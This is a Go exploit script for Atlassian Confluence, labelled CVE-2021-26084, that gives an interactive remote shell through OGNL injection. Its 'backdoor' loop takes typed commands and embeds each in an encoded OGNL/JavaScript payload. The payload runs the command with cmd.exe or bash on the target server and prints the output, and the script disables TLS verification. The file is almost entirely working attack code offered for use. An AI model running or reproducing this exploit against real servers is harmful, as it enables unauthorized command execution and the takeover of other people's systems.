package main

import (
    "os"
    "fmt"
    "flag"
    "time"
    "os/exec"
    "strings"
    "net/http"
    "io/ioutil"
    "crypto/tls"
    "compress/gzip"
    "github.com/fatih/color"
)

func ascii(){
    clear()
    fmt.Println(`
 /\_/\  Confluence OGNL injection
( o.o )    > CVE-2021-26084 <
 > ^ <
`)
}

func Between(str, starting, ending string) string {
    s := strings.Index(str, starting)
    if s < 0 {
        return ""
    }
    s += len(starting)
    e := strings.Index(str[s:], ending)
    if e < 0 {
        return ""
    }
    return str[s : s+e]
}

func error(err interface{}) {
    if err != nil{
        panic(err)
    }
}

func frescura(){
    fmt.Print("[")
    color.Set(color.FgGreen)
    fmt.Print("+")
    color.Set(color.FgWhite)
    fmt.Print("]")
}

func clear() {
    out, err := exec.Command("clear").Output()
    if err != nil {
        fmt.Printf("%s", err)
    }
    output := string(out[:])
    fmt.Println(output)
}

func backdoor(url string){

    for{  
        var comando_shell string
        fmt.Print("like a magic ~> ")
        fmt.Scan(&comando_shell)

        var payload string = `queryString=aaaaaaaa%5Cu0027%2B%7BClass.forName%28%5Cu0027javax.script.ScriptEngineManager%5Cu0027%29.newInstance%28%29.getEngineByName%28%5Cu0027JavaScript%5Cu0027%29.%5Cu0065val%28%5Cu0027var+isWin+%3D+java.lang.System.getProperty%28%5Cu0022os.name%5Cu0022%29.toLowerCase%28%29.contains%28%5Cu0022win%5Cu0022%29%3B+var+cmd+%3D+new+java.lang.String%28%5Cu0022` +comando_shell+ `%5Cu0022%29%3Bvar+p+%3D+new+java.lang.ProcessBuilder%28%29%3B+if%28isWin%29%7Bp.command%28%5Cu0022cmd.exe%5Cu0022%2C+%5Cu0022%2Fc%5Cu0022%2C+cmd%29%3B+%7D+else%7Bp.command%28%5Cu0022bash%5Cu0022%2C+%5Cu0022-c%5Cu0022%2C+cmd%29%3B+%7Dp.redirectErrorStream%28true%29%3B+var+process%3D+p.start%28%29%3B+var+inputStreamReader+%3D+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3B+var+bufferedReader+%3D+new+java.io.BufferedReader%28inputStreamReader%29%3B+var+line+%3D+%5Cu0022%5Cu0022%3B+var+output+%3D+%5Cu0022%5Cu0022%3B+while%28%28line+%3D+bufferedReader.readLine%28%29%29+%21%3D+null%29%7Boutput+%3D+output+%2B+line+%2B+java.lang.Character.toString%2810%29%3B+%7D%5Cu0027%29%7D%2B%5Cu0027`
        cli := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}

        req, err := http.NewRequest(http.MethodPost, url, strings.NewReader(payload))
        error(err)   

        req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0")
        req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
        req.Header.Add("Accept-Encoding", "gzip, deflate")
        req.Header.Add("Connection", "close")
        req.Header.Add("Accept", "*/*")

        time.Sleep(1 * time.Second)

        request, err := cli.Do(req)
        if err != nil {
            return
        }
        defer func() {
            _ = request.Body.Close()
        }()

        post, err := gzip.NewReader(request.Body)
        _ = post
        if err == nil {
            corpo, err := ioutil.ReadAll(post)

            if err == nil {
                    fmt.Println(" ")
                    fmt.Print(Between(string(corpo),"aaaaaaaa[","]"))
            }
        }    
    }
}
func main() {
	ascii()
	var apiUrl string

	flag.StringVar(&apiUrl, "u", "", "")
	flag.CommandLine.Usage = func() { fmt.Println("\n./exploit -u 'http://pwnme.com.br/pages/createpage-entervariables.action?SpaceKey=x'") }
	flag.Parse()

	if len(apiUrl) == 0 {

	url_vazia, err := os.OpenFile(apiUrl, os.O_RDWR, 0000)
	_ = url_vazia
	if err != nil {
		color.Red("plz specify an url")
		return
	}
}
    frescura()
    fmt.Println(" starting the exploit ")
    time.Sleep(1 * time.Second)
    frescura()
    fmt.Println(" enjoy your shell >:) ")
    fmt.Println(" ")
    time.Sleep(1 * time.Second)
    backdoor(apiUrl)
}
